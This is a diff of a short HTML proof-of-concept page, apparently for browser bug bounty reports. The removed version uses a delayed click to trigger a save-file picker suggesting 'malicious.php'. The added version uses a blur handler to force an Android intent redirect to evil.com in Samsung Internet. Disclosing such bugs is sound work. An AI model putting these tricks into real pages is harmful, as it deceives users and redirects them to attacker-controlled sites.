@@ -1,54 +1,20 @@
+<html>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Delayed File Save Picker</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: sans-serif;
-      background-color: #fafafa;
-      cursor: pointer;
-      user-select: none;
-    }
-    h1 {
-      color: #333;
-      text-align: center;
-      max-width: 400px;
-      padding: 20px;
-    }
-  </style>
-</head>
 <body>
-  <h1>Click me anywhere.<br>Browse to hackerone.com and download the file from HackerOne</h1>
 
-  <script>
-    document.addEventListener('click', async () => {
-      setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
-          try {
-            const handle = await window.showSaveFilePicker({
-              suggestedName: 'malicious.php',
-              types: [{
-                description: 'Text Files',
-                accept: {'text/plain': ['.php']},
-              }],
-            });
+<script>
 
-            const writable = await handle.createWritable();
-            await writable.write('This is a test file content.');
-            await writable.close();
-          } catch (err) {
-            // User canceled or error occurred — silently ignore
-          }
-        }
-      }, 3000);
-    }, { once: true });
-  </script>
+window.onblur=function incognito() {
+
+
+location.replace('intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end');
+
+
+}
+
+</script>
+
+<h1> CLICK HOME icon FOR POC </h1>
+
 </body>
 </html>
